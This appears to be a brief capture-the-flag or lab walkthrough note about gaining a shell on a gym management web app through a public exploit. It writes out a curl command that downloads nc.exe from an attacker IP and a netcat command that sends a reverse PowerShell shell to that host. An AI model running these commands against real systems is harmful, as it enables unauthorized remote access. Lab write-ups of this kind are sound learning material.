looking around google to find exploit for gym manager we found a [[Shellshock]]  #gym1managment 

running the python script we got a shell but it's so unstable so what we can do we can download nc on the server and get a stable reverse shell 
using curl on the server we downloaded the netcat 
curl http://10.10.17.185:8000/nc.exe -o nc.exe 
then we ran 
nc.exe 10.10.17.185 2239 -e powershell
